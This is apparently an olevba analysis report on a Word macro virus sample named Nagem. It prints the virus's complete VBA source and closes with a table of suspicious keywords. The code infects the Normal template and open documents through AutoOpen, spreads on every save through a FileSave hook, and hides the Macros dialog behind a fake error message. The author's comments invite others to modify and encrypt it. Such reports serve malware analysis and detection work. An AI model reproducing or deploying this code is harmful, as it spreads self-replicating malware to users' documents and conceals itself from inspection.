olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Nagem-115d4e65d2dd8790ea3d20fba9ce3bbba2cb3bf8
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Nagem-115d4e65d2dd8790ea3d20fba9ce3bbba2cb3bf8 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Magan_Macro.bas 
in file: Virus.MSWord.Nagem-115d4e65d2dd8790ea3d20fba9ce3bbba2cb3bf8 - OLE stream: 'Macros/VBA/Magan_Macro'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Distributed for Changes/Upgradation etc. in
'Open Source Code.
' If you are interested in developing,modifying,
'crypting etc. this document using your skills,
'you are FREE to do so.
' Don't forget to give credits also to
'"Anonymous Creater of Megan V1.0"
' Nick of course is Magan
' Best of Luck
' Explanation Also Included.

Dim Ni, Di As Integer
Sub AutoOpen()
'There are no destructive routines in
'this document.
On Error GoTo 1

'Find if Normal is already infected!
With Normal.ThisDocument.VBProject.VBComponents
    For Ni = 1 To .Count
            If (.Item(Ni).Name = "Magan_Macro") Then
                GoTo 3
            End If
    Next Ni
End With

'Infect Normal
With ThisDocument.VBProject.VBComponents
    For Di = 1 To .Count
       If (.Item(Di).Name = "Magan_Macro") Then
          .Item(Di).Export ("MaganM.BAS")
          ' I know that the above is not the best way, still,
          'It is the easiest to understand.
          Normal.ThisDocument.VBProject.VBComponents.Add(1).CodeModule.AddFromFile ("MaganM.BAS")
          Kill ("MaganM.BAS")
          Exit For
       End If
Next Di
End With

GoTo 2

3

With ActiveDocument.VBProject.VBComponents
For Ni = 1 To .Count
            If (.Item(Ni).Name = "Magan_Macro") Then
                GoTo 1
            End If
Next Ni
End With

With Normal.ThisDocument.VBProject.VBComponents
For Di = 1 To .Count
       If (.Item(Di).Name = "Magan_Macro") Then
          .Item(Di).Export ("MaganM.BAS")
          ActiveDocument.VBProject.VBComponents.Add(1).CodeModule.AddFromFile ("MaganM.BAS")
          Kill ("MaganM.BAS")
          Exit For
       End If
Next Di
End With
ActiveDocument.Saved = False
2
Normal.ThisDocument.Saved = False
1
End Sub

Sub ToolsMacro()
Attribute ToolsMacro.VB_Description = "Disables the Tools->Macro->Macros... command under English version of Word."
Attribute ToolsMacro.VB_ProcData.VB_Invoke_Func = "Project.NewMacros.ToolsMacro1"
'This macro disables the Tools->Macros->Macros...
'Command under English version of Word.

'If you are here, you know the in and out of the
'macro programming i belive.
MsgBox "This Command is Unavaliable this time.", vbCritical, "Microsoft Word"
End Sub

Sub FileSave()
'Just to Spread.
'Note : Works only under English Version.
On Error Resume Next
AutoOpen
ActiveDocument.Save
End Sub

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|command             |May run PowerShell commands                  |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

